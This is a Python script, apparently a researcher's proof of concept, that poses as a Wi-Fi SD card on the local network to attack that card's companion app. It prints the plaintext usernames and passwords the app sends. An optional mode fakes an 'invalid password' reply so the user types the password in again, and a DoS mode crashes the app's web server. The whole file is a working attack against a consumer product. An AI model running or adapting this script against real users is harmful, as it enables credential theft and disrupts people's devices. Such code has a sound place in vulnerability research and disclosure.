import socket
import struct
import os
from uuid import getnode # get mac address
from time import sleep
import ipaddress

# These constants were all taken directly or derived from the decompiled APK

DETECTOR_PORT = 24387
WEB_SERVER_PORT = 8080

MAGIC = b"FC1307"

CMD_CARD_INFO = 1
CMD_GET_PASSWORD_TYPE = 17
CMD_NEW_DATA_IN_CARD = 9
CMD_ONLINE_WIFI_MODE_CHANGE = 15
CMD_QUERY_WIFI_INFO = 11
CMD_READ_DATA = 4
CMD_SCAN_SSID = 16
CMD_SET_WIFI_INFO = 10
COMMAND_CODE_OFFSET = 7
DIRECTION_OFFSET = 6
DIRECTION_RECEIVE = 1 # I swapped the values of send and receive to make more sense in the context of the server
DIRECTION_SEND = 2
MINIMUM_PACKET_LENGTH = 8
PASSWORD_LENGTH_OFFSET = 15
USERNAME_LENGTH_OFFSET = 14
USERNAME_OFFSET = 16
USERPASSWORD_OFFSET = 32

START_LBA_OFFSET = 8
TOTAL_XFER_COUNT_OFFSET = 12
TRANSFER_ID_OFFSET = 48

BLOCK_SIZE = 512
MAX_BLOCKS = 14 # maximum blocks to send in a single packet


# CONFIG #
DOS_MODE = False
PW_STEAL_MODE = False
PW_RETRY_COUNT = 1
LOCAL_IP = "192.168.0.36"
FAKE_STORAGE_PATH = "test.img"

fake_storage_size = os.stat(FAKE_STORAGE_PATH).st_size
fake_storage = open(FAKE_STORAGE_PATH, "rb")

pw_retries = 0

def mk_packet(command, data):
	header = MAGIC + bytes([DIRECTION_SEND, command])
	return header + data


def mk_info_packet():
	ip_addr = ipaddress.ip_address(LOCAL_IP).packed # Local IP TODO don't hardcode IP
	mac_addr = struct.pack("!Q", getnode())[2:8] # getnode() may return the address of any NIC, although an invalid MAC doesn't seem to affect things
	interface = b"SD"
	version = b"Ver 4.00.10"
	capacity = struct.pack("!I", 1337000//512) # 1.337MB of storage!
	apmode = b"\x01" # NULL means AP, any other value means station
	subversion = b".0.17"
	subversion_len = struct.pack("B", len(subversion))
	
	data = b"\x00" * 6 + \
		ip_addr + \
		mac_addr + \
		interface + \
		version + \
		capacity + \
		apmode + \
		subversion_len + \
		subversion
	
	return mk_packet(CMD_CARD_INFO, data)


def execute_dos(addr):
	ip, port = addr
	print("\n[+] App detected at {}, waiting for web server.".format(ip))
	www = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	while True:
		try:
			www.connect((ip, WEB_SERVER_PORT))
			break
		except ConnectionRefusedError:
			sleep(1)
	
	www.send(b"GET / HTTP/1.1\r\n\r\n")
	www.close()
	print("[*] DoS complete.")


detector = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
detector.bind(("0.0.0.0", DETECTOR_PORT))

print("[*] Listening on port {}".format(DETECTOR_PORT))

while True:
	data, addr = detector.recvfrom(8192)
	
	if data == b"KTC":
		detector.sendto(mk_info_packet(), addr)
		print("\n[*] Info packet sent")
		if (DOS_MODE):
			execute_dos(addr)
			sleep(1)
		continue
	
	if len(data) < MINIMUM_PACKET_LENGTH or data[:len(MAGIC)] != MAGIC:
		print("\n[-] Invalid packet:")
		print(repr(data))
		print(repr(addr))
		continue
	
	command = data[COMMAND_CODE_OFFSET]
	direction = data[DIRECTION_OFFSET]
	
	if direction != DIRECTION_RECEIVE:
		continue
	
	if command == CMD_GET_PASSWORD_TYPE:
		username_end = USERNAME_OFFSET + data[USERNAME_LENGTH_OFFSET]
		password_end = USERPASSWORD_OFFSET + data[PASSWORD_LENGTH_OFFSET]
		username = data[USERNAME_OFFSET:username_end]
		password = data[USERPASSWORD_OFFSET:password_end]
		print("\n[+] Received plaintext \"authentication\" packet!!!")
		print("Username: " + repr(username))
		print("Password: " + repr(password))
		
		response = [0] * 8
		if (PW_STEAL_MODE):
			if pw_retries < PW_RETRY_COUNT:
				print("\n[*] Sending invalid password response")
				response[6] = 0xFF # This will cause the user to be prompted to re-enter their password. A value of 1 triggers guest mode
				pw_retries += 1
			else:
				pw_retries = 0
		
		detector.sendto(mk_packet(CMD_GET_PASSWORD_TYPE, bytes(response)), addr) # tell the client we authed successfully..
		
	elif command == CMD_READ_DATA:
		ip, port = addr
		
		lba = struct.unpack_from("!I", data, START_LBA_OFFSET)[0]
		n_blocks = struct.unpack_from("!H", data, TOTAL_XFER_COUNT_OFFSET)[0]
		tid = struct.unpack_from("!I", data, TRANSFER_ID_OFFSET)[0]
		
		print("\n[*] Read {} blocks at offset {}".format(n_blocks, lba * BLOCK_SIZE))
		
		fake_storage.seek(lba * BLOCK_SIZE)
		
		for lba_offset in range(0, n_blocks, MAX_BLOCKS):
			n_bytes = min(n_blocks-lba_offset, MAX_BLOCKS) * BLOCK_SIZE
			storage_data = fake_storage.read(n_bytes)
			header = struct.pack("!IHHHI", lba, lba_offset, 0x18, n_bytes, tid) + b"\x00\x00"
			detector.sendto(mk_packet(CMD_READ_DATA, header + storage_data), (ip, port))
			print("[*] sent {} bytes to port {}".format(n_bytes, port))
			port += 1
			sleep(0.002) # for whaterver reason, the app gets unhappy if we send data too fast (shitty code?)
		
	else:
		print("\n[-] Unimplemented command: {}".format(command))

